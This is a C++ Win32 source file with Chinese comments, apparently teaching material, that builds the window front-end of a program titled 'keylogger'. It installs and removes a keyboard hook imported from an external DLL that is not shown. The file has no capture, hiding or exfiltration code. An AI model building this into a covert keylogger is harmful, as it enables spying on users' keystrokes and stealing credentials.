#include <Windows.h>
#pragma comment(lib, "key.lib")

extern "C" {
	// 安装钩子
	__declspec(dllimport) BOOL InstallHook();
	// 卸载钩子
	__declspec(dllimport) BOOL UninstallHook();
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);

// 使用大坑：控制台和桌面程序的入口函数不一样
// 入口函数 
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstance, LPSTR lpCmdLine, int nCmdShow) {
	// 1. 窗口
		// 1）设计窗口类
	TCHAR szAppClassName[] = TEXT("DunKaiEDU");
	WNDCLASS wc = { 0 };
	wc.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);    // 加载白色画刷
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);				   // 加载光标
	wc.hIcon = NULL;
	wc.hInstance = hInstance;								   // 当前应用实例句柄
	wc.lpfnWndProc = WindowProc;							   // 窗口处理函数
	wc.lpszClassName = szAppClassName;						   // 窗口类型名
	wc.style = CS_HREDRAW | CS_VREDRAW;

	// 2）注册窗口类
	RegisterClass(&wc);
	// 3）创建窗口
	HWND hWnd = CreateWindow(szAppClassName, TEXT("键盘记录器"), WS_BORDER | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME | WS_MAXIMIZEBOX | WS_MINIMIZEBOX, 300, 200, 600, 400, NULL, NULL, hInstance, NULL);
	// 4）显示窗口和更新窗口
	ShowWindow(hWnd, SW_SHOW);
	UpdateWindow(hWnd);
	// 5）消息循环 
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		// 将虚拟键消息转换为字符消息
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// 2. HOOK
	// 3. 处理 

	return 0;
}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {

	switch (uMsg) {
		case WM_CREATE: {
			InstallHook();
			break;
		}
		case WM_CLOSE: {   // 窗口关闭消息
			DestroyWindow(hWnd);
			break;
		}
		case WM_DESTROY: {   // 窗口销毁消息
			UninstallHook();
			PostQuitMessage(0);
			break;
		}
	}
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}


